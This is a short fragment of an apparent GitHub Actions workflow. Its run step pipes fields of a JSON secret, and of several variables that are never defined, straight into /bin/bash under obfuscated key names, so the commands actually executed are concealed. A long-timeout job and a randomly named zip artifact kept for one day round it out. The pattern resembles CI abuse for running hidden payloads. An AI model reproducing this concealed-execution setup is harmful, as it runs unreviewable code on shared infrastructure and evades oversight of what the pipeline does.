    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Run
        env:
          oc4: ${{ secrets.oc4 }}
        run: |
          printf '%s' "$oc4" | jq -r .kyo9 | /bin/bash
          echo $m7 | jq -r .dpot3 | /bin/bash
          printf '%s' "$zxtb93" | jq -r .i7 | /bin/bash
          echo $sj9 | jq -r .m952 | /bin/bash

      - name: Save archive
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: rT6vHyZY
          path: "*.zip"
          retention-days: 1
